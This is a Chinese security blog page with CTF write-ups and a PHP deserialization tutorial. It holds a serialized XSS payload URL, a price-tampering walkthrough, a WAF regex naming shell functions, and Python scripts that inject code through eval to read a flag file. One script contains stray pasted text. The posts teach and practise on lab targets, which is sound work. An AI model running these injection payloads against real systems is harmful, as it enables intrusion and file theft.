<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test &#x3D; &quot;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new A();</span><br><span class="line">$c-&gt;age &#x3D; &quot;18&quot;;</span><br><span class="line">echo serialize($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>其中反序列化的a变量是可控的，并且一旦反序列化会自动执行魔法方法<code>__wakeup</code>并且输出test。</p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E5%BA%8F%E5%88%97%E5%8C%962..png"></p>
<p>O表示存储的对象(object类型)；还有一种情况是A，代表数组。</p>
<p>1表示对象名称有1个字符，即A。</p>
<p>2表示对象里面有2个变量。</p>
<p>s表示变量数据类型，string类型；i：表示int。</p>
<p>4表示变量名的字符串长度，即test；以此类推。</p>
<h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">    var $test &#x3D; &quot;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">            echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c &#x3D; new A();</span><br><span class="line">$c-&gt;age &#x3D; &quot;18&quot;;</span><br><span class="line"></span><br><span class="line">$val &#x3D; serialize($c);</span><br><span class="line">$NewExample &#x3D; unserialize($val);</span><br><span class="line">echo $NewExample-&gt;age;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>如图：</p>
<p><img src="https://chen-lishan.gitee.io/tuc/%E5%8F%8D%E5%BA%8F%E5%88%97..png"></p>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>PHP反序列化漏洞利用需要的条件：</p>
<p>1.unserialize函数的参数可控</p>
<p>2.所写的内容需要有对象中的成员变量的值</p>
<p>3.脚本中存在一个构造函数（__construct()）、析构函数（__destruct()）、__wakeup()函数中有向php文件中写数据的操作的类</p>
<p>有一些PHP的魔法函数会导致反序列化漏洞，如：</p>
<p>(如果服务器能够接收我们反序列化过的字符串、并且未经过滤的把其中的变量直接放进这些魔术方法里面的话，就容易造成严重漏洞)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&#96;__construct&#96; 当一个对象创建时自动调用</span><br><span class="line"></span><br><span class="line">&#96;__wakeup&#96; 使用unserialse()函数时会自动调用</span><br><span class="line"></span><br><span class="line">&#96;__destruct&#96; 当对象被销毁时自动调用 (php绝大多数情况下会自动调用销毁对象)</span><br><span class="line"></span><br><span class="line">&#96;__toString&#96; 当一个对象被当作一个字符串被调用。</span><br><span class="line"></span><br><span class="line">&#96;__sleep()&#96; 使用serialize()函数时触发</span><br><span class="line"></span><br><span class="line">&#96;__call()&#96;  在对象上下文中调用不可访问的方法时触发 </span><br><span class="line"></span><br><span class="line">&#96;__callStatic()&#96; 在静态上下文中调用不可访问的方法时触发</span><br><span class="line"></span><br><span class="line">&#96;__get()&#96; 用于从不可访问的属性读取数据</span><br><span class="line"></span><br><span class="line">&#96;__set()&#96; 用于将数据写入不可访问的属性</span><br><span class="line"></span><br><span class="line">&#96;__isset()&#96; 在不可访问的属性上调用isset()或empty()触发 </span><br><span class="line"></span><br><span class="line">&#96;__unset()&#96; 在不可访问的属性上使用unset()时触发</span><br><span class="line"></span><br><span class="line">&#96;__toString()&#96; 把类当作字符串使用时触发,返回值需要为字符串</span><br><span class="line"></span><br><span class="line">&#96;__invoke()&#96; 当脚本尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>



<p>常用魔术被调用的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class test &#123;</span><br><span class="line">    public $varr1 &#x3D; &quot;abc&quot;;</span><br><span class="line">    public $varr2 &#x3D; &quot;123&quot;;</span><br><span class="line">    public function echoP() &#123;</span><br><span class="line">        echo $this-&gt;varr1.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        echo &quot;__construct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        echo &quot;__destruct&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString() &#123;</span><br><span class="line">        return &quot;__toString&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __sleep() &#123;</span><br><span class="line">        echo &quot;__sleep&lt;br&gt;&quot;;</span><br><span class="line">        return array(&#39;varr1&#39;,&#39;varr2&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup() &#123;</span><br><span class="line">        echo&quot;__wakeup&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$obj &#x3D; new test();&#x2F;&#x2F;实例化对象，调用__construct()方法，输出__construct</span><br><span class="line">$obj-&gt;echoP();    &#x2F;&#x2F;调用echoP()方法，输出&quot;abc&quot;</span><br><span class="line">echo $obj;        &#x2F;&#x2F;obj对象被当做字符串输出，调用__toString()方法，输出__toString</span><br><span class="line">$s &#x3D;serialize($obj);   &#x2F;&#x2F;obj对象被序列化，调用__sleep()方法，输出__sleep</span><br><span class="line">echo unserialize($s);  &#x2F;&#x2F;$s首先会被反序列化，会调用__wake()方法，被反序列化出来的对象又被 当做字符串，就会调用_toString()方法。 &#x2F;&#x2F; 脚本结束又会调用__destruct()方法，输出__destruct</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>根据上面的例子，这里我们只要构造payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?test&#x3D;O:1:%22A%22:2:&#123;s:4:&quot;test&quot;;s:28:&quot;&lt;img src&#x3D;1 onerror&#x3D;alert(1)&gt;&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>就能控制echo出的变量</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/11/18/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98%EF%BC%88python%E8%84%9A%E6%9C%AC%EF%BC%89/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/18/%E7%AE%80%E5%8D%95%E7%9A%84%E8%AE%A1%E7%AE%97%E9%A2%98%EF%BC%88python%E8%84%9A%E6%9C%AC%EF%BC%89/" class="post-title-link" itemprop="url">简单的计算题（python脚本）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-11-18 00:00:00" itemprop="dateCreated datePublished" datetime="2020-11-18T00:00:00+08:00">2020-11-18</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
        <time title="修改时间：2020-11-29 12:24:36" itemprop="dateModified" datetime="2020-11-29T12:24:36+08:00">2020-11-29</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="绿帽子商场"><a href="#绿帽子商场" class="headerlink" title="绿帽子商场"></a>绿帽子商场</h2><p>输入题目网址，出现商品及价格，第二行是我们要买的flag，1000元，而最后一行显示：你有500元。所以我们要想办法搞到1000，才能买到flag。</p>
<p>打开代理，点击flag后面的buy按钮，打开Burp Suite</p>
<p>需要加上session，如图：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/1000..png"></p>
<p>点击GO之后，显示钱不够。</p>
<p>那么，我们可以买雪碧</p>
<p>将flag改为xuebi，price仍为1000，原有的500-1000=-500，如图</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E9%9B%AA%E7%A2%A71.png"></p>
<p>再将1000改为-1000，则结果为1500，那么现在就有1500了</p>
<p>然后，将xuebi改为flag，点击GO</p>
<p>即可买到flag，提交答案。</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/flag..png"></p>
<h2 id="简单的计算题"><a href="#简单的计算题" class="headerlink" title="简单的计算题"></a>简单的计算题</h2><p>输入网址，出现有两串极长数字的计算题，可以用Python计算，Python可以当作计算器。打开Python，将数字复制过去，enter后出现答案，将答案复制提交，显示：U 4re right，给出源码，点击Source：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/jisuan..png"></p>
<p>可以复制到Sublime，以便查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">function calculator()&#123;</span><br><span class="line">    srand(time());</span><br><span class="line">    $param1 &#x3D; rand();</span><br><span class="line">    $param2 &#x3D; rand();</span><br><span class="line">    $flag  &#x3D;rand(0,4);</span><br><span class="line">    switch ($flag) &#123;</span><br><span class="line">        case 0:</span><br><span class="line">            return sprintf(&quot;%s+%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">        case 1:</span><br><span class="line">            return sprintf(&quot;%s-%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">        case 3:</span><br><span class="line">            return sprintf(&quot;%s*%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">        case 4:</span><br><span class="line">            return sprintf(&quot;%s&#x2F;%s&quot;,$param1,$param2);</span><br><span class="line">        break;</span><br><span class="line">    &#125;&#x2F;&#x2F;计算器，加减乘除的运算</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function waf($str)&#123;</span><br><span class="line">    if(preg_match(&quot;&#x2F;put|sys|exec|\&#96;|\^|\%|\~\&#x2F;|passthru|popen|cat|\\|preg|ph|\&lt;\?|\&lt;|ar|un|sc|va&#x2F;is&quot;, $str))&#123;</span><br><span class="line">        die(&quot;no hack&quot;);&#x2F;&#x2F;对这个内容进行过滤</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;以下用正则替换，把传进来的payload进行替换</span><br><span class="line">if(isset($_GET[&#39;a&#39;]))&#123;</span><br><span class="line">    waf($_GET[&#39;a&#39;]);&#x2F;&#x2F;首先进行一层过滤，对a过滤</span><br><span class="line">    $payload &#x3D; preg_replace(&quot;&#x2F;;&#x2F;&quot;, &quot;&quot;, $_GET[&#39;a&#39;]);&#x2F;&#x2F;两个斜杠中间的分号替换为空</span><br><span class="line">    $go &#x3D; sprintf(&quot;\$check&#x3D;(%s&#x3D;&#x3D;%s);&quot;,$_SESSION[&#39;expr&#39;],$payload);&#x2F;&#x2F;把检查结果赋值给check；计算器随机生成一个表达式，返回给SESSION，给第一个%s；payload给第二个%s，payload是我们传进来的答案；“&#x3D;&#x3D;”比较两个值是否相等，check判断结果是否正确</span><br><span class="line">    &#x2F;&#x2F;echo $go;</span><br><span class="line">    eval($go);&#x2F;&#x2F;写出的表达式会进行一次eval。这里有一个很明显的代码注入，如何注入代码，可以在本地phpstudy中测试一下</span><br><span class="line"></span><br><span class="line">    if($check)&#123;</span><br><span class="line">        $_SESSION[&#39;expr&#39;] &#x3D;  calculator();&#x2F;&#x2F;此处调用了计算器,计算器随机生成一个表达式，返回给SESSION</span><br><span class="line">        $answer &#x3D;  &quot;U 4re right&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $answer &#x3D;  &quot;Try again!&quot;;    </span><br><span class="line">    &#125;&#x2F;&#x2F;如果check是正确的，就会显示&quot;U 4re right&quot;，否则&quot;Try again!&quot;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $_SESSION[&#39;expr&#39;]&#x3D;calculator();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;source&#39;]))&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">    &lt;!-- 上述3个meta标签*必须*放在最前面，任何其他内容都*必须*跟随其后！ --&gt;</span><br><span class="line">    &lt;title&gt;简单的计算题&lt;&#x2F;title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;!-- Bootstrap --&gt;</span><br><span class="line">    &lt;link href&#x3D;&quot;static&#x2F;bootstrap.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;</span><br><span class="line"></span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">  &lt;!-- jQuery (Bootstrap 的所有 JavaScript 插件都依赖 jQuery，所以必须放在前边) --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;jquery-3.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">    &lt;!-- 加载 Bootstrap 的所有 JavaScript 插件。你也可以根据需要只加载单个插件。 --&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;static&#x2F;bootstrap.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&lt;div class&#x3D;&quot;row&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-md-4&quot; position&#x3D;&quot;absolute&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;page-header&quot;&gt;</span><br><span class="line">            &lt;h1&gt;简单的计算题&lt;&#x2F;h1&gt;</span><br><span class="line">        &lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">            </span><br><span class="line">                &lt;h4&gt;&lt;?php echo $_SESSION[&#39;expr&#39;];?&gt;&lt;&#x2F;h4&gt;</span><br><span class="line">            </span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">            &lt;form role&#x3D;&quot;form&quot; method&#x3D;&quot;GET&quot; action&#x3D;&quot;&quot;&gt;</span><br><span class="line">              &lt;div class&#x3D;&quot;form-group&quot;&gt;</span><br><span class="line">                &lt;label for&#x3D;&quot;name&quot;&gt;答案&lt;&#x2F;label&gt;</span><br><span class="line">                &lt;input type&#x3D;&quot;text&quot; class&#x3D;&quot;form-control&quot; id&#x3D;&quot;name&quot; name&#x3D;&quot;a&quot; placeholder&#x3D;&quot;请输入你的答案&quot;&gt;</span><br><span class="line">              &lt;&#x2F;div&gt;</span><br><span class="line">              &lt;button type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-default&quot;&gt;提交&lt;&#x2F;button&gt;</span><br><span class="line">            &lt;&#x2F;form&gt;</span><br><span class="line">            &lt;center&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;</span><br><span class="line">            &lt;h3&gt;&lt;?php echo $answer ;?&gt;&lt;&#x2F;h3&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;col-md-4&quot;&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">&lt;&#x2F;body&gt;&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>第32行if语句中的a：</p>
<p>抓包：在答案输入框中随意输入一些字符，如aaaa，打开火狐代理，点击提交，然后打开Burp Suite，可以看到，我们传入的参数a=提交的aaaa</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%8A%93%E5%8C%85a.png"></p>
<p>输入网址127.0.0.1，出现计算题，计算后提交答案，然后可以查看页面源代码。</p>
<p>返回，在网址后加“）”，可以将前面的数字闭合掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (file_get_contents(&#39;.&#x2F;flag&#39;)[0]&#x3D;&#x3D;&#39;f&#39;)</span><br></pre></td></tr></table></figure>

<p>file_get_contents：读文件，将flag读取出来</p>
<p>and需要两边都正确</p>
<p>需要先写一个脚本，拆出来</p>
<p>先写个爬虫，把表达式爬下来</p>
<p>文件名命名为exp.py，后缀是.py，文件保存之后点击工具，选择“编译系统”，点击Python，然后运行，出现表达式：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/biaodashi..png"></p>
<p>用正则表达式把表达式爬下来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">print(expr)</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p>[‘111968951*261483365’]</p>
<p>然后用eval把表达式结果算出来：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">print(eval(expr[0]))</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p>1841553614048981688</p>
<p>得到的结果用参数a传进去：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/pawangzhi.png"></p>
<p>然后读flag，先读第一位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(file_get_contents(&#39;&#x2F;flag&#39;)[0])import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28027&#x2F;?a&#x3D;%s&quot;%(str(eval(expr[0]))+&quot; and (file_get_contents(&#39;&#x2F;flag&#39;)[0])&#x3D;&#x3D;&#39;f&#39;&quot;) #用%s格式化字符串写</span><br><span class="line"></span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure>

<p>运行之后，得到payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28047&#x2F;?a&#x3D;%s&quot;%(str(eval(expr[0]))+&quot; and (file_get_contents(&#39;&#x2F;flag&#39;)[0])&#x3D;&#x3D;&#39;f&#39;&quot;)</span><br><span class="line">a&#x3D; r.get(url)</span><br><span class="line">if &quot;Try again!&quot; not in a.text:</span><br><span class="line">   print(&quot;yes&quot;)</span><br></pre></td></tr></table></figure>

<p>输出：yes</p>
<p>接着：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">r &#x3D; requests.session();</span><br><span class="line"></span><br><span class="line">result &#x3D; r.get(&quot;http:&#x2F;&#x2F;47.98.234.232:28047&quot;)</span><br><span class="line"></span><br><span class="line">expr &#x3D; re.findall(&quot;&lt;h4&gt;(.*?)&lt;&#x2F;h4&gt;&quot;,result.text)</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;47.98.234.232:28047&#x2F;?a&#x3D;%s and (file_get_contents(&#39;&#x2F;flag&#39;)[0])&#x3D;&#x3D;&#39;%s&#39;&quot;%(str(eval(expr[0])),&#39;f&#39;)</span><br><span class="line">a&#x3D; r.get(url)</span><br><span class="line">if &quot;Try again!&quot; not in a.text:</span><br><span class="line">   print(&quot;yes&quot;)</span><br></pre></td></tr></table></figure>

<p>完成：</p>
<p><img src="https://gitee.com/chen-lishan/tuc/raw/master/%E6%9C%80%E7%BB%88%E7%BB%93%E6%9E%9C.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://-181.github.io/2020/11/01/%E6%97%A0%E5%8F%82%E6%95%B0RCE/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/image/avatar.jpg">
      <meta itemprop="name" content="左">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="左">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/01/%E6%97%A0%E5%8F%82%E6%95%B0RCE/" class="post-title-link" itemprop="url">无参数RCE</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2020-11-01 00:00:00" itemprop="dateCreated datePublished" datetime="2020-11-01T00:00:00+08:00">2020-11-01</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">更新于</span>
